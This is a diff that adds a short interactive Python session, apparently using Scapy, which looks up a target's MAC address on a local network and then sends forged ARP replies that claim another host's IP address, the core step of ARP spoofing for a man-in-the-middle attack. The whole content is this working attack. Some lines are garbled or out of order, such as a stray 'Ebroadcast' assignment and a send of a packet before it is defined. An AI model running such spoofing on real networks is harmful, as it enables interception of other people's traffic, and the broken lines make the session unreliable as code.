@@ -1,0 +1,15 @@
+
+>>> finalpacket.pdst = "192.168.100.6"
+>>> mac_address = broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+>>> broadcast = Ebroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+>>> answer = srp(finalpacket, timeout=2, verbose=False)[0]
+>>> answer
+<Results: TCP:0 UDP:0 ICMP:0 Other:1>
+>>> mac = answer[0][1].hwsrc
+>>> mac
+'60:02:92:60:da:ed'
+>>> send(packet, verbose=False)
+>>> packet = ARP(op=2, hwdst="60:02:92:60:da:ed", pdst="192.168.100.6", psrc = "192.168.100.4")
+>>> send(packet, verbose=False)
+
+
